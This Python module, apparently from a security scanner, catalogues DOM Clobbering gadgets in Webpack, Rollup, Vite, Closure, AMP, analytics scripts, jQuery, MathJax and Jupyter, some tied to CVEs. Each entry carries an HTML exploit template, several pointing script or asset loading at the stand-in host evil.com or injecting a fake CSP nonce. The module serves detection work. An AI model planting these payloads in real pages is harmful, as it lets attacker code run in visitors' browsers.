"""Known framework DOM Clobbering gadget patterns.

Hard-coded patterns for detecting DOM Clobbering vulnerabilities in
popular JavaScript frameworks and libraries. Each pattern describes
the clobberable property, the impact, and an exploit template.
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class FrameworkPattern:
    name: str
    cve: str | None
    property_name: str       # what gets clobbered (e.g., "__webpack_public_path__")
    access_pattern: str      # how it's accessed (e.g., "window.__webpack_public_path__")
    impact: str              # description of impact
    exploit_template: str    # HTML clobbering payload
    chain_depth: int = 1     # required clobbering depth
    score_bonus: int = 15    # bonus score when matched


FRAMEWORK_PATTERNS: tuple[FrameworkPattern, ...] = (
    # Webpack
    FrameworkPattern(
        name="webpack_public_path",
        cve="CVE-2024-43788",
        property_name="__webpack_public_path__",
        access_pattern="__webpack_require__.p",
        impact="Script base URL hijacking — all chunk loads redirected to attacker domain",
        exploit_template='<a id="__webpack_public_path__" href="//evil.com/"></a>',
    ),
    FrameworkPattern(
        name="webpack_currentScript",
        cve="CVE-2024-43788",
        property_name="currentScript",
        access_pattern="document.currentScript",
        impact="Script source URL hijacking via document.currentScript.src",
        exploit_template='<img name="currentScript" src="//evil.com/base/">',
    ),
    FrameworkPattern(
        name="webpack_nonce",
        cve=None,
        property_name="__webpack_nonce__",
        access_pattern="window.__webpack_nonce__",
        impact="CSP nonce injection — bypass script-src nonce requirement",
        exploit_template='<a id="__webpack_nonce__" href="attacker-nonce"></a>',
    ),

    # Rollup
    FrameworkPattern(
        name="rollup_currentScript",
        cve="CVE-2024-47068",
        property_name="currentScript",
        access_pattern="document.currentScript",
        impact="Bundle base URL hijacking in CJS/UMD/IIFE output",
        exploit_template='<a id="currentScript" href="//evil.com/bundle.js"></a>',
    ),

    # Vite
    FrameworkPattern(
        name="vite_currentScript",
        cve="CVE-2024-45812",
        property_name="currentScript",
        access_pattern="document.currentScript",
        impact="Asset URL hijacking via __VITE_ASSET__ replacement",
        exploit_template='<img name="currentScript" src="//evil.com/__VITE_ASSET__">',
    ),

    # Google Closure Library
    FrameworkPattern(
        name="closure_base_path",
        cve=None,
        property_name="CLOSURE_BASE_PATH",
        access_pattern="window.CLOSURE_BASE_PATH",
        impact="Closure base.js loading path hijacking",
        exploit_template='<a id="CLOSURE_BASE_PATH" href="//evil.com/closure/"></a>',
    ),
    FrameworkPattern(
        name="closure_uncompiled_defines",
        cve=None,
        property_name="CLOSURE_UNCOMPILED_DEFINES",
        access_pattern="window.CLOSURE_UNCOMPILED_DEFINES",
        impact="Closure compilation defines override",
        exploit_template='<div id="CLOSURE_UNCOMPILED_DEFINES"></div>',
    ),

    # AMP
    FrameworkPattern(
        name="amp_mode",
        cve=None,
        property_name="AMP_MODE",
        access_pattern="window.AMP_MODE",
        impact="AMP runtime mode override — redirect AMP script loading",
        exploit_template='<form id="AMP_MODE"><input name="version" value="latest"></form>',
        chain_depth=2,
    ),
    FrameworkPattern(
        name="amp_config",
        cve=None,
        property_name="AMP_CONFIG",
        access_pattern="window.AMP_CONFIG",
        impact="AMP configuration override",
        exploit_template='<form id="AMP_CONFIG"><input name="cdnUrl" value="//evil.com/"></form>',
        chain_depth=2,
    ),

    # Google Analytics
    FrameworkPattern(
        name="ga_classic",
        cve=None,
        property_name="_gaq",
        access_pattern="window._gaq",
        impact="Google Analytics classic queue hijacking — data exfiltration",
        exploit_template='<div id="_gaq"></div>',
    ),
    FrameworkPattern(
        name="ga_universal",
        cve=None,
        property_name="ga",
        access_pattern="window.ga",
        impact="Google Analytics universal tracker hijacking",
        exploit_template='<div id="ga"></div>',
    ),
    FrameworkPattern(
        name="gtm_dataLayer",
        cve=None,
        property_name="dataLayer",
        access_pattern="window.dataLayer",
        impact="Google Tag Manager dataLayer poisoning",
        exploit_template='<div id="dataLayer"></div>',
    ),

    # jQuery
    FrameworkPattern(
        name="jquery_htmlPrefilter",
        cve=None,
        property_name="htmlPrefilter",
        access_pattern="jQuery.htmlPrefilter",
        impact="jQuery HTML preprocessing override",
        exploit_template='<form id="jQuery"><input name="htmlPrefilter"></form>',
        chain_depth=2,
    ),

    # MathJax
    FrameworkPattern(
        name="mathjax_config",
        cve=None,
        property_name="MathJax",
        access_pattern="window.MathJax",
        impact="MathJax configuration override — potential script injection",
        exploit_template='<form id="MathJax"><input name="config" value="//evil.com/"></form>',
        chain_depth=2,
    ),

    # Jupyter
    FrameworkPattern(
        name="jupyter_base_url",
        cve="CVE-2024-43805",
        property_name="__webpack_nonce__",
        access_pattern="window.__webpack_nonce__",
        impact="Jupyter Notebook CSP nonce bypass via Markdown HTML injection",
        exploit_template='<a id="__webpack_nonce__" href="evil"></a>',
    ),

    # Generic: document.currentScript (used by many bundlers)
    FrameworkPattern(
        name="generic_currentScript",
        cve=None,
        property_name="currentScript",
        access_pattern="document.currentScript",
        impact="document.currentScript clobbering — base URL hijacking for any script using this API",
        exploit_template='<img name="currentScript" src="//evil.com/">',
    ),
)

# Build lookup indexes
PATTERNS_BY_PROPERTY: dict[str, list[FrameworkPattern]] = {}
for _p in FRAMEWORK_PATTERNS:
    PATTERNS_BY_PROPERTY.setdefault(_p.property_name, []).append(_p)

ALL_FRAMEWORK_PROPERTIES: frozenset[str] = frozenset(p.property_name for p in FRAMEWORK_PATTERNS)


def match_property(property_name: str) -> list[FrameworkPattern]:
    """Return all framework patterns matching a given property name."""
    return PATTERNS_BY_PROPERTY.get(property_name, [])
